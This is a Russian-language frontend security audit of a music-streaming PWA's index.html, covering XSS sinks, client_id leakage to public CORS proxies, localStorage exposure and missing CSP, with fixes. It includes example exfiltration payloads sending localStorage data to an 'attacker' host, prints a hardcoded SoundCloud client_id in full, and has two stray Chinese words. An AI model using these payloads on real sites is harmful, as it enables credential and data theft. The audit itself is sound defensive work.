# UI Security Audit — index.html

**Объект:** `soundwave/index.html` (2093 строки, PWA, без фреймворка, инлайн-`<script>`).
**Метод:** статический ручной аудит, без запуска и без сетевых запросов. Исходный код не изменялся.
**Связь с `SECURITY_AUDIT.md`:** серверные находки (H-1, M-1, L-3…L-6) и общая CSP (M-2) здесь не
дублируются — только углубляются с позиции **фронтенда**. Находки, где `index.html` является
источником/эксплуатируемой стороной, выделены как UI-* и посчитаны в сводке ниже.

---

## Сводка

| Уровень | Кол-во | ID |
|---|---|---|
| Critical | 0 | — |
| High | 2 | UI-1, UI-2 |
| Medium | 2 | UI-3, UI-4 |
| Low | 3 | UI-5, UI-6, UI-7 |
| *Info/positive* | — | UI-8 (не в счёт) |

Краткое отличие от `SECURITY_AUDIT.md`: M-3 (импорт) там оценён Medium с оговоркой «рендер
экранирует (`esc()`)». Это **неверно** для полей `id`/`uid`/`pl.id` — они попадают в атрибуты
`data-*` **без** `esc()` (см. UI-2), что превращает импорт в реальный persisted-XSS → с учётом
отсутствия CSP (UI-3) даёт кражу `client_id`. Поэтому UI-2 повышен до **High**.

---

## Секреты в коде

### UI-S1. Захардкоженный `client_id` SoundCloud (`FALLBACK_CID`)
- **Файл:** `index.html:597` — `const FALLBACK_CID = 'UMY1dzQ68n2QbCuypNe8JOivmV2FO2Ep';`
- **Использование:** `index.html:598` — `let cid = LS.get('cid', null) || FALLBACK_CID;`
  (фолбэк, если пользователь не сохранил свой ключ), далее подставляется в каждый API-запрос
  (`apiGet`, `index.html:655`) и в запрос потокового URL (`index.html:723`).
- **Значение (частично):** `UMY1dzQ68n2QbCuypNe8JOiv…` (32 символа, формат SoundCloud client_id).
- **Попадание в бандл:** копируется в IPA через `ios/make-ipa.js:18` → `www/index.html`
  (доступен через `unzip`).
- **Severity:** Low (SoundCloud `client_id` — полу-публичный ключ, лежит в публичных
  JS-бандлах SoundCloud; но как «захардкоженный секрет в исходнике/бандле» — валиден).
  См. также `SECURITY_AUDIT.md` L-1. Углубление: этот же фолбэк-ключ, если его не заменить
  пользователем, **утекает на публичные CORS-прокси** (UI-1) — т.е. секрет не просто «лежит в
  бандле», а активно отправляется третьим сторонам при отсутствии локального прокси.
- **Фикс:**
  ```js
  // Не зашивать фолбэк; при первом запуске вызывать discoverCid() (уже есть, index.html:637)
  // и хранить результат только в localStorage. Поле cid-input оставить для ручного ввода.
  let cid = LS.get('cid', null);
  if (!cid) { discoverCid().catch(() => toast('Не удалось найти ключ, введите вручную')); }
  ```

Других захардкоженных API-ключей/токенов/паролей в `index.html` **нет**. Константа `API`
(`index.html:596`, `https://api-v2.soundcloud.com`) секретом не является.

---

## XSS поверхности

Экскурс: `esc()` (`index.html:530`) экранирует `& < > " '` — корректен для HTML-текста и
двойно-кавычных атрибутов. `eval`/`Function`/`new Function`/`document.write`/`outerHTML`
**отсутствуют** (подтверждено; см. `SECURITY_AUDIT.md` F-6). Ниже — все sink'и `innerHTML`/
`insertAdjacentHTML` и их наполнение.

### Таблица sink'ов

| file:line | sink | чем наполняется | источник | риск | фикс |
|---|---|---|---|---|---|
| `index.html:964` | `skeleton()` → innerHTML | статика | — | нет | — |
| `index.html:966` | `emptyState()` innerHTML | `esc(title)`, `esc(text)` | текст ошибок (`'HTTP '+r.status`), `libFilterQ` (user input) | нет (экранируется) | — |
| `index.html:971-982` | `trackRow()` innerHTML | `esc(t.art)` (src), `esc(t.title)`, `esc(t.artist)`; **`data-tid="${t.id}"`, `data-uid="${t.uid}"`, `data-like="${t.id}"` БЕЗ esc** | API SoundCloud + **localStorage (импорт)** | **UI-2 High** (атрибут breakout через строковый `id`/`uid`) | `Number(t.id)`/`Number(t.uid)` или `esc(t.id)` |
| `index.html:987-990` | `loadCaros` skeleton | статика | — | нет | — |
| `index.html:996-1000` | `loadCaros` rows | `esc(art/title/artist)` | API | нет | — |
| `index.html:1016` | `renderList` insertAdjacentHTML | `trackRow` (см. 971) | API/import | **UI-2** | (см. UI-2) |
| `index.html:1038` | insertAdjacentHTML `EQ` | статичный SVG | — | нет | — |
| `index.html:1042,1045` | `.innerHTML = I.heart\|I.heartF` | статичный SVG | — | нет | — |
| `index.html:1054` | skeleton | статика | — | нет | — |
| `index.html:1072` | emptyState | `esc(err)` | ошибка сети | нет | — |
| `index.html:1077-1082` | `renderPlRows` innerHTML | `esc(p.art/title/user)`; **`data-pl="${p.id}"` БЕЗ esc** | API + import | **UI-2** | `Number(p.id)`/`esc` |
| `index.html:1107` | `#sugg` innerHTML | `esc(s)` | статика (`SUGG`) | нет | — |
| `index.html:1116` | `#hist` innerHTML | `esc(s)` | localStorage `shistory` (может быть отравлен импортом) | нет (экранируется) | — |
| `index.html:1140` | `#genres` innerHTML | `esc(q/label)` | статика (`GENRES`) | нет | — |
| `index.html:1158,1167` | emptyState | esc | — | нет | — |
| `index.html:1224-1231` | `renderLib` (playlists) innerHTML | `esc(p.name)`; **`data-pll="${p.id}"` БЕЗ esc** | локальные плейлисты + **импорт** | **UI-2** | `Number(p.id)`/`esc` |
| `index.html:1237` | emptyState | `esc('…«'+libFilterQ+'»…')` | user input (`#lib-q`) | нет (экранируется) | — |
| `index.html:1258-1260` | `addToPlaylistSheet` innerHTML | `esc(p.name)`; **`data-addpl="${p.id}"` БЕЗ esc** | локальные плейлисты + импорт | **UI-2** | `Number(p.id)`/`esc` |
| `index.html:1308-1309,1333-1335` | `textContent` | — | API | нет (textContent) | — |
| `index.html:1441-1446` | `renderQueue` innerHTML | `esc(art/title/artist)`; **`data-tid="${t.id}"` БЕЗ esc** | API + import | **UI-2** | `Number(t.id)`/`esc` |
| `index.html:1565-1571` | `shareCard` openSheet innerHTML | `src="${data}"` (canvas data:URL, self-gen); **`${t.link \|\| ''}` БЕЗ esc** | API `permalink_url` | **UI-6 Low** (stored XSS, контролируется SoundCloud) | `esc(t.link \|\| '')` |
| `index.html:1583` | `openSheet` innerHTML | html от вызывающих (esc, кроме `shareCard` t.link) | — | нет (кроме UI-6) | — |
| `index.html:1703` | `openPage` innerHTML | html от `openArtist/openSCPlaylist/openLocalPlaylist/openStats` | API (esc) | нет (кроме UI-2 через trackRow) | — |
| `index.html:1714-1720` | `openArtist` | `esc(a.art/name/desc)`, `onerror=` inline | API | нет (esc) | убрать inline `onerror` (UI-3) |
| `index.html:1730,1751` | emptyState | `esc(err)` | ошибка | нет | — |
| `index.html:1740-1746` | `openSCPlaylist` | `esc(first.art)`, trackRow | API | нет (кроме UI-2) | — |
| `index.html:1758-1761` | `openLocalPlaylist` | trackRow (id) | localStorage/import | **UI-2** | — |
| `index.html:1793-1806` | `openStats` | `esc(n)` (имя артиста), числа | localStorage `stats` (из API) | нет | — |
| `index.html:1814` | export textarea | `esc(data)` (JSON-stringify state) | localStorage | нет | — |
| `index.html:1822` | import textarea | статика | — | нет | — |
| `index.html:1929` | lyr skeleton | статика | — | нет | — |
| `index.html:1937` | lyr synced | `esc(l.text)` | lrclib/Genius (через прокси) | нет (esc, см. F-8) | — |
| `index.html:1940` | lyr plain | `esc(line)` | lrclib/lyrics.ovh/Genius | нет (esc) | — |
| `index.html:1990-1991` | `#accents` innerHTML | `style="background:linear-gradient(${v[0]},${v[1]})"` из статичных `ACCENTS` | статика | нет | — |

### UI-2 (High) — Persisted XSS через строковый `id`/`uid` в `data-*` без `esc()`

- **Файл, строки:** `index.html:971` (`data-tid="${t.id}"`), `:975` (`data-uid="${t.uid}"`),
  `:980` (`data-like="${t.id}"`), `:1077` (`data-pl="${p.id}"`), `:1224` (`data-pll="${p.id}"`),
  `:1258` (`data-addpl="${p.id}"`), `:1441` (`data-tid="${t.id}"`).
- **Описание:** `esc()` применяется к `title`/`artist`/`art`, но **не** к `id`/`uid`/`pl.id`,
  которые интерполируются прямо в двойно-кавычные атрибуты `data-*`. SoundCloud-вские ID всегда
  числовые (из API), поэтому для легитимных данных это безопасно. **Однако** путь импорта
  (`index.html:1824-1834`) не валидирует, что `id` — число:
  ```js
  // index.html:1829
  state.likes = j.likes.filter(x => x && x.id && !ids.has(x.id)).concat(state.likes);
  // index.html:1830
  if (Array.isArray(j.playlists)) state.playlists = j.playlists.concat(state.playlists);
  ```
  `x.id` проверяется лишь на truthy — строка проходит. Тот же `state.playlists`/`history`
  конкатенируются без проверки структуры элемента. Далее значение сохраняется в `sw_likes`/
  `sw_playlists`/`sw_history` и при следующем рендере попадает в `data-tid="…"` без `esc()`.
- **Вектор атаки:**
  1. Злоумышленник делится «экспортом SoundWave» (`#data-export`, `index.html:1810`), в поля
     `likes`/`playlists`/`history` кладёт элементы с `id` вида
     `x" ontouchstart="fetch('//attacker/'+localStorage['sw_cid'])" data-x="`.
  2. Жертва жмёт «Импорт» (`index.html:1820`) и вставляет строку.
  3. `state.likes` сохраняет строковый `id`; `renderLib`→`trackRow` рендерит
     `data-tid="x" ontouchstart="fetch('//attacker/'+localStorage['sw_cid'])" data-x=""`.
  4. Любое касание/наведение на строку списка — **XSS**, читает `sw_cid` и всё `localStorage`,
     шлёт на сервер атакующего (`connect-src` не ограничен — UI-3).
- **Уточнение к `SECURITY_AUDIT.md`:** M-3 заявляет, что импорт ограничен благодаря `esc()`. Это
  **ошибка** — `id`/`uid`/`pl.id` в `data-*` **не** экранируются, поэтому импорт эксплуатируем.
- **Severity:** **High** (требует действия пользователя — вставка恶意 импорта; но даёт full
  compromise при отсутствии CSP — UI-3, и существует реальный社交 вектор обмена «экспортами»).
- **Фикс:**
  ```js
  // 1. Принудительно число для id/uid в normTrack (index.html:668):
  return {
    id: Number(t.id) || 0,
    uid: Number(t.user && t.user.id) || 0,
    ...
  };
  // 2. В импорте — валидировать структуру (index.html:1824):
  const norm = arr => Array.isArray(arr) ? arr.filter(x => x && Number(x.id) > 0)
    .map(x => ({ ...x, id: Number(x.id), uid: Number(x.uid) || 0 })) : [];
  state.likes = norm(j.likes).filter(x => !ids.has(x.id)).concat(state.likes);
  state.playlists = norm(j.playlists).map(p => ({ ...p, id: Number(p.id) || Date.now() }));
  state.history = norm(j.history).slice(0, 100);
  // 3. Доп. defense-in-depth — esc() в шаблонах:
  //   data-tid="${esc(t.id)}"  data-uid="${esc(t.uid)}"  data-pl="${esc(p.id)}"
  //   data-pll="${esc(p.id)}"  data-addpl="${esc(p.id)}"  data-like="${esc(t.id)}"
  ```

### UI-6 (Low) — `t.link` без `esc()` в `shareCard`
- **Файл:** `index.html:1571` — `<p class="note">…${t.link || ''}</p>` (контекст `index.html:1564-1571`).
- **Источник:** `t.link = t.permalink_url` (`index.html:679`) — поле из API SoundCloud. Это
  единственный **прямой** sink, куда API-данные попадают в innerHTML без `esc()`. SoundCloud
  генерирует `permalink_url` серверно из санитизированных username/track-title, поэтому `<`/`>`/`"`
  там не появляются — реальный импакт ~нулевой. Но это **stored-XSS поверхность, контролируемая
  SoundCloud** (или компрометированным/подменённым CORS-прокси).
- **Severity:** Low. См. также `SECURITY_AUDIT.md` L-2.
- **Фикс:** `<p class="note">${isNative ? '' : '…'}${esc(t.link || '')}</p>`

> Примечание: `index.html:1573` `navigator.share({ title: t.title+' — '+t.artist, url: t.link })` —
> не DOM-sink, выполняется через нативный share-UI; XSS через него невозможен.

---

## Утечка `client_id` (публичные прокси) — конкретные URL + строки

### UI-1 (High) — `client_id` уезжает на `corsproxy.io` / `allorigins.win` в query-string

- **Точки:**
  - `index.html:607` — `if (t === 'p1') return 'https://corsproxy.io/?url=' + encodeURIComponent(url);`
  - `index.html:608` — `if (t === 'p2') return 'https://api.allorigins.win/raw?url=' + encodeURIComponent(url);`
  - `index.html:619` — `order.push('direct', 'p1', 'p2');` (фолбэк-цепочка в `rawFetch`).
  - `index.html:629` — `const r = await fetch(wrapUrl(t, url), { cache: 'no-store' });` — собственно
    запрос на публичный прокси.
- **Что уходит:** URL, передаваемый в `wrapUrl(t,url)`, к моменту вызова **уже содержит
  `client_id` в query**:
  - `index.html:654-656` (`apiGet`):
    ```js
    const qs = new URLSearchParams(params);
    qs.set('client_id', cid);
    const r = await rawFetch(`${API}${path}?${qs}`); // → https://api-v2.soundcloud.com/...?client_id=...
    ```
  - `index.html:723` (`getStreamUrl`):
    ```js
    const r = await rawFetch(pick.url + (pick.url.includes('?') ? '&' : '?') + 'client_id=' + encodeURIComponent(cid));
    ```
  При отсутствии локального прокси (`probeLocal` вернул false, `index.html:603`) и `direct`-запрос
  падает по CORS — `rawFetch` доходит до `p1`/`p2`, и итоговый URL
  `https://api-v2.soundcloud.com/search/tracks?q=…&client_id=…` целиком уезжает на
  `corsproxy.io/?url=…` и `api.allorigins.win/raw?url=…` → **логируется владельцами прокси**.
- **Углубление к H-2:** утечка касается не только `client_id`. Через `rawFetch` на публичные
  прокси идут **все** запросы UI, в т.ч. лирика, где в query лежат **listening metadata**
  (название + артист текущего трека):
  - `index.html:1858` — `https://lrclib.net/api/search?track_name=<esc(title)>&artist_name=<esc(artist)>`
  - `index.html:1871` — `https://lrclib.net/api/search?q=<title + ' ' + artist>`
  - `index.html:1885` — `https://api.lyrics.ovh/v1/<artist>/<title>`
  - `index.html:1897` — `https://genius.com/api/search/multi?q=<title + ' ' + artist>`
  Эти эндпоинты, как правило, не отдают CORS → `direct` падает → фолбэк на `p1`/`p2` →
  `corsproxy.io`/`allorigins.win` видят, **что именно слушает пользователь**. Это
  privacy-утечка поверх credential-утечки.
- **Вектор:** пассивная утечка третьим лицам (владельцам публичных CORS-прокси) персонального
  `client_id` SoundCloud + метаданных прослушивания. Ключ может быть абьюзнут для API-запросов
  от имени/с IP-профилем пользователя; при абузе SoundCloud инвалидирует ключ.
- **Severity:** **High** (источник — `index.html`; сервер тут ни при чём). См. `SECURITY_AUDIT.md` H-2.
- **Фикс:**
  ```js
  // Никогда не пускать чужие CORS-прокси для запросов, содержащих client_id или личные данные:
  function wrapUrl(t, url){
    if (t === 'local') return '/sc?url=' + encodeURIComponent(url);
    if (t === 'p1' || t === 'p2'){
      // p1/p2 — ТОЛЬКО для анонимных запросов (скрейпинг soundcloud.com/assets, public OEmbed);
      // для api-v2 SoundCloud (с client_id) и для лирики — fallback на direct, без утечки:
      if (/[?&]client_id=/.test(url)) return url;
      if (/(api-v2\.soundcloud\.com|lrclib\.net|api\.lyrics\.ovh|genius\.com)/.test(url)) return url;
    }
    return url;
  }
  // Лучше: разделить «авторизованный» транспорт (api-v2 — только local/native) и
  // «анонимный» (скрейп assets, public oembed — можно через p1/p2).
  async function rawFetch(url, { auth = false } = {}){
    let order = [];
    if (window.__swNativeFetch) order.push('native');
    if (localProxy) order.push('local');
    if (auth) order.push('direct');               // client_id-запросы — без публичных прокси
    else order.push('direct', 'p1', 'p2');        // анонимные — можно через прокси
    if (transport !== 'auto') order = [transport, ...order.filter(t => t !== transport)];
    ...
  }
  // В вызовах:
  rawFetch(`${API}${path}?${qs}`, { auth: true });          // apiGet
  rawFetch(pick.url + '...client_id=...', { auth: true });  // getStreamUrl
  rawFetch('https://lrclib.net/...', { auth: true });        // лирика (личные данные)
  ```

---

## Хранилище (localStorage) — что и риск при XSS

Все ключи хранятся с префиксом `sw_` через обёртку `LS` (`index.html:538-541`):
`LS.get` делает `JSON.parse` без валидации структуры (см. UI-4).

| Ключ | Где пишется | Содержимое | Утечка при XSS |
|---|---|---|---|
| `sw_cid` | `:598,651,1978` (`setCid`/`cid-save`) | SoundCloud **client_id** | **Credential theft** — ключ уезжает атакующему; даёт абуз API от имени ключа |
| `sw_session` | `:906,913` (`saveSession`/`restoreSession`) | очередь `q` (массив треков), индекс, позиция, источник, shuffle/repeat/speed | профиль прослушивания + активная очередь |
| `sw_likes` | `:558,951` | массив объектов треков (title/artist/uid/art/link/...) | **полный список «любимых»** (приватное) |
| `sw_history` | `:559,960` | последние 100 прослушанных треков | история прослушивания |
| `sw_playlists` | `:560,1253,1266,1276,1766` | пользовательские плейлисты | приватные подборки |
| `sw_stats` | `:561,934` | `{sec, art:{}, day:{}, tracks}` — суммарное время, по артистам/дням | статистика прослушивания |
| `sw_shistory` | `:1114,1124,1126` | последние 8 поисковых запросов | **поисковые запросы** (потенциально чувствительные) |
| `sw_accent`/`sw_amoled`/`sw_autorel`/`sw_fullonly`/`sw_viz`/`sw_wake`/`sw_shuffle`/`sw_repeat` | `:562-568,2016,...` | настройки UI/поведения | низкое (preferences) |

- **Риск при XSS (с учётом UI-2/UI-6 + UI-3):** любой XSS-выполнение (`fetch` не ограничен
  CSP) делает `for (const k of Object.keys(localStorage)) fetch('//attacker',{method:POST,body:localStorage.getItem(k)})`.
  В первую очередь утекают **`sw_cid`** (credential) и **`sw_session`/`sw_likes`/`sw_history`/
  `sw_stats`/`sw_shistory`** (полный listening-profile). В iOS-режиме XSS дополнительно открывает
  нативный мост `webkit.messageHandlers.sw.postMessage` → webview-SSRF (см. `SECURITY_AUDIT.md` M-1).
- **Дополнительно:** `localStorage` можно **отравить** через импорт (UI-2/UI-4) — тем же путём
  кладётся строковый `id`, который потом выполняется как XSS. Т.е. хранилище — не только
  жертва, но и носитель persisted-XSS-payload.

---

## CSP и общий профиль риска

### UI-3 (Medium) — Отсутствие Content-Security-Policy (углубление M-2)
- **Файл:** `index.html:1-16` (`<head>` без `<meta http-equiv="Content-Security-Policy">`).
- **Усугубляющие факторы в `index.html`:**
  - инлайн `<script>` (`index.html:526`);
  - инлайн `<style>` (`index.html:16`);
  - **6 инлайн-обработчиков `onerror=`** — `index.html:972, 997, 1078, 1443, 1715, 1741`
    (в `SECURITY_AUDIT.md` M-2 перечислено **5**, пропущено `:1715` в `openArtist`).
    Содержимое статично (`this.onerror=null;this.src=PLACEHOLDER`), данных пользователя/API в
    нём нет, но они требуют `'unsafe-inline'` в `script-src`.
- **Ущерб при XSS (полный профиль):** без CSP любая XSS-дыра (UI-2/UI-6) немедленно =
  full RCE-эквивалент в контексте страницы:
  1. чтение всего `localStorage` → кража `sw_cid` + listening-data;
  2. `fetch` на произвольный origin (нет `connect-src`) — эксфильтрация;
  3. вызов `window.__swNativeFetch` / `webkit.messageHandlers.sw.postMessage` (iOS) →
     webview-SSRF на любые HTTPS-хосты (M-1);
  4. запись в `localStorage` persisted-payload (цепь с UI-2);
  5. `navigator.clipboard.writeText` (если разрешено) / `navigator.share` — вторичные.
- **Severity:** Medium (defense-in-depth; сам по себе не эксплуатируется, но снимает последний
  барьер для UI-2/UI-6).
- **Фикс (meta + заменить inline):**
  ```html
  <meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    img-src 'self' data: https://*.sndcdn.com https://*.soundcloud.com;
    media-src 'self' https://*.sndcdn.com https://*.soundcloud.com blob:;
    connect-src 'self' https://api-v2.soundcloud.com https://*.soundcloud.com https://*.sndcdn.com https://lrclib.net https://api.lyrics.ovh https://genius.com;
    script-src 'self' 'unsafe-inline';
    style-src 'self' 'unsafe-inline';
    frame-ancestors 'none';">
  ```
  Плюс (в `server.js`) — добавлять тот же CSP в заголовок ответа статики.
  Инлайн `onerror=` заменить на делегирование:
  ```js
  // после каждой перерисовки списков — один раз навесить обработчик:
  cont.addEventListener('error', e => { const img = e.target.closest('img'); if (img){ img.onerror=null; img.src = PLACEHOLDER; } }, true);
  // и убрать onerror="…" из шаблонов trackRow/renderPlRows/renderQueue/openArtist/openSCPlaylist.
  ```
  `frame-ancestors 'none'` закрывает UI-7.

### UI-7 (Low) — Глобальные функции на `window` + отсутствие `frame-ancestors`/`X-Frame-Options`
- **Файл:** `index.html:544` (`window.__swNativeFetch`), `:733` (`window.__swAudioTime`),
  `:739` (`window.__swAudioEvent`), `:886` (`window.__swRemote` — управляет play/pause/next/prev/seek),
  `:901` (`window.__swSavedPhoto`).
- **Описание:** Эти функции — интерфейс к нативному мосту iOS/Tauri. В web-режиме они
  вызываются только самим кодом. Но если страницу встроить в `<iframe>` (с тем же origin),
  родитель может вызывать их напрямую (SOP не мешает same-origin). Для cross-origin iframe
  родитель не получит доступ к `contentWindow.__swRemote` (SOP), но **clickjacking** остаётся:
  можно наложить iframe и заставить пользователя нажать `#clr-hist` (`index.html:2038`,
  чистит историю одним тапом без подтверждения) — `#clr-likes` защищён `confirm()` (`:2040`).
  `server.js` не выставляет `X-Frame-Options`/`frame-ancestors`.
- **Severity:** Low. Фикс — `frame-ancestors 'none'` (см. UI-3 CSP) или
  `X-Frame-Options: DENY` в `server.js`.

---

## Небезопасный парсинг внешних данных (UI-4, Medium — углубление M-3)

- **`LS.get` — `JSON.parse` без валидации** (`index.html:539`): обёрнуто в `try/catch`
  (fail-closed), но структура не проверяется. Если `localStorage` отравлен (импорт/XSS),
  `state.likes` может оказаться не массивом → падение рендера (self-DoS), либо массивом с
  строковыми `id` (→ UI-2).
- **Импорт — `Object.assign(state, j.settings)`** (`index.html:1833`) + конкатенация массивов
  (`:1829-1831`) без проверки полей по схеме. `Object.assign` копирует own-enumerable свойства;
  ключ `__proto__` из `JSON.parse` становится own-свойством и при `Object.assign(state, {__proto__:…})`
  может переопределить прототип `state` (ограниченный импакт — `state` — локальный объект).
  Существеннее — запись произвольных типов: `state.accent` мог стать объектом (используется как
  ключ в `ACCENTS`, падает в `|| ACCENTS.orange` — не эксплуатируется, но фрагильно).
- **`r.json()` ответа API** (`index.html:663, 725, 1860, 1873, 1887, 1899`) — без schema-валидации.
  Звенья:
  - `getStreamUrl` (`:725`) — `const j = await r.json(); if (!j.url) throw…; return j.url;`
    `j.url` далее устанавливается как `audio.src` (`:786`) **без проверки хоста**. `<audio
    src=javascript:…>` не выполняет JS (audio-элемент не исполняет js:-URL), но при
    компрометации публичного прокси ответ мог бы вернуть `j.url = 'https://attacker/x.mp3'` →
    браузер тянет поток с сервера атакующего (раскрывает IP/заголовки). В web-режиме local-прокси
    это поймает на этапе `:870` (`/sc?url=…` отклонит чужой хост), но при `direct`/native — нет.
  - `parseLRC` (`:1841-1849`) — regex, `text` далее проходит `esc()` (`:1937,1940`). Безопасно.
  - Genius HTML-скрейпинг (`:1907-1912`) — теги режутся, сущности раскодируются, итог через
    `esc()`. Безопасно (см. F-8).
- **Вектор:** самоповреждение через вставленный импорт + (при подмене прокси-ответа) подмена
  `mediaUrl`. Реальный импакт ограничен (`esc` в лирике, `direct`-фильтр хостов на сервере),
  но схема непроверенного слияния — неверная.
- **Severity:** Medium (углубление M-3; основной эксплойт — через UI-2, не сам по себе).
- **Фикс:** см. UI-2 (валидация `id`/схемы при импорте) + валидация `j.url` в `getStreamUrl`:
  ```js
  const u = new URL(j.url);
  if (!/(^|\.)sndcdn\.com$/.test(u.hostname) && !/(^|\.)soundcloud\.com$/.test(u.hostname))
    throw new Error('чужой хост потока');
  return j.url;
  ```

---

## Обход allowlist: формирование URL для прокси (UI-5, Low)

- **Механизм:** UI формирует URL и передаёт в `rawFetch` → далее либо `/sc?url=` (local, на
  `server.js`), либо `__swNativeFetch` (native iOS), либо `direct`, либо публичный прокси.
  Сам UI **не** валидирует хост самостоятельно — полагается целиком на `server.js` `HOST_OK`
  (web) или ни на что (native, см. M-1).
- **Произвольный URL от пользователя в `url`-параметр?** Нет — пользовательский ввод
  (поисковый запрос, `#q`/`#lib-q`, жанр) попадает только в **query-параметры** через
  `URLSearchParams`/`encodeURIComponent`:
  - `index.html:687` — `apiGet('/search/tracks', { q, limit, offset })` → `URLSearchParams`
  - `index.html:1858,1871,1885,1897` — лирика через `encodeURIComponent(title/artist)`
  Эти значения не могут вырваться за пределы query и подменить host. **SSRF через
  пользовательский ввод в `url`-параметре прокси отсутствует.**
- **Что ВИТает в `rawFetch` без валидации хоста (берётся из API-ответа):**
  - `index.html:723` — `pick.url` (URL транскодинга из ответа `api-v2.soundcloud.com/...`);
  - `index.html:1904` — `hits[0]` (URL лирики из ответа `genius.com`).
  В web-режиме: оба проходят `wrapUrl('local', …)` → `server.js` → `HOST_OK` корректно отсекает
  чужие хосты (см. `SECURITY_AUDIT.md` F-1) → SSRF нет. В native-режиме: `__swNativeFetch`
  выполняет запрос без проверки → webview-SSRF (M-1). Глубокий фикс — валидировать хост в
  самом UI ДО отправки в любой транспорт.
- **Severity:** Low (в web-режиме — defence-in-depth, реальной дыры нет; в iOS — уже M-1).
- **Фикс:**
  ```js
  const API_HOSTS = /^https:\/\/([^/]+\.)?(soundcloud\.com|sndcdn\.com|lrclib\.net|api\.lyrics\.ovh|genius\.com)(\/|$)/i;
  function safeUrl(u){ try { const x = new URL(u); return API_HOSTS.test(x.href) ? x.href : null; } catch { return null; } }
  // перед rawFetch(pick.url, …) и rawFetch(hits[0], …):
  const su = safeUrl(pick.url); if (!su) throw new Error('неразрешённый хост потока');
  rawFetch(su + (su.includes('?') ? '&' : '?') + 'client_id=' + encodeURIComponent(cid));
  ```

---

## Внешние ресурсы / mixed content / отслеживание (UI-8, info-positive)

- **Внешних `<script src>`/`<link rel=stylesheet href>` нет** — весь CSS/JS инлайн. SRI
  применять не к чему (и не нужно для инлайна).
- `<link rel="manifest" href="manifest.webmanifest">` (`:13`), `<link rel="apple-touch-icon">`
  (`:14`), `<link rel="icon">` (`:15`) — same-origin; SRI к manifest/иконкам неприменим.
- **Mixed content отсутствует:** все API/artwork URLs — `https://` (`api-v2.soundcloud.com`,
  `*.sndcdn.com`, `lrclib.net`, `api.lyrics.ovh`, `genius.com`); `http://` нигде не формируется.
- **Tracker'ов/аналитики нет** (нет GA/Sentry/Facebook/...). Запросы уходят только на
  SoundCloud, лирику и (опционально) публичные CORS-прокси.
- `img.crossOrigin='anonymous'` в `shareCard` (`:1527`) — для canvas; если CDN не отдаёт CORS,
  canvas tainted → `toDataURL` бросает (не в try/catch — `:1562`, минор robustness, не security).

---

## EventSource / WebSocket / iframe (task #8)

- `EventSource` — **нет**.
- `WebSocket` — **нет**.
- `<iframe>` — **нет**.
- Связь с нативным мостом — через `webkit.messageHandlers.sw.postMessage` (в одну сторону) и
  через глобальные функции `window.__swAudioTime`/`__swAudioEvent`/`__swRemote`/`__swSavedPhoto`
  (нативный код дёргает их напрямую). `postMessage` между окнами не используется. См. UI-7 по
  вопросу frame-ancestors.

---

## Рекомендации (по приоритету)

### P1 — High
1. **UI-1: не пускать `client_id`/личные данные на публичные прокси.** В `wrapUrl`
   (`index.html:605-610`) — для `p1`/`p2` возвращать `url` как есть (→ `direct`), если URL
   содержит `client_id=` или указывает на `api-v2.soundcloud.com`/`lrclib.net`/
   `api.lyrics.ovh`/`genius.com`. Разделить «авторизованный» транспорт (`local`/`native`
   only) и «анонимный» (`p1`/`p2` — только для скрейпа assets/oembed). См. сниппет в UI-1.
2. **UI-2: валидировать `id`/`uid` в импорте и экранировать в `data-*`.** `Number(t.id)` в
   `normTrack`; фильтр `Number(x.id) > 0` в импорте (`:1829-1831`); `esc()` в шаблонах
   `data-tid`/`data-uid`/`data-like`/`data-pl`/`data-pll`/`data-addpl`. См. сниппет в UI-2.

### P2 — Medium
3. **UI-3: поставить CSP** (meta + заголовок в `server.js`), `connect-src` — белый список
   хостов (см. сниппет); убрать инлайн `onerror=` → делегированный обработчик ошибок `img`.
4. **UI-4: валидировать `j.url` в `getStreamUrl`** на хост `*.sndcdn.com`/`*.soundcloud.com`;
   схема-валидация импортируемых настроек (`accent` — строка-ключ `ACCENTS`, `amoled`/… —
   boolean) вместо `Object.assign(state, j.settings)`.

### P3 — Low
5. **UI-5:** завести `safeUrl()` и проверять хост API-возвращаемых URL (`pick.url`, `hits[0]`)
   перед `rawFetch`.
6. **UI-6:** `esc(t.link || '')` в `shareCard` (`:1571`).
7. **UI-7:** `frame-ancestors 'none'` (через CSP UI-3) или `X-Frame-Options: DENY` в
   `server.js`.
8. **UI-S1:** убрать `FALLBACK_CID` из исходника/бандла; при первом запуске — `discoverCid()`.

---

*Аудит выполнен Безопасником #2 (фронтенд). Изменений в исходный код не вносилось.*
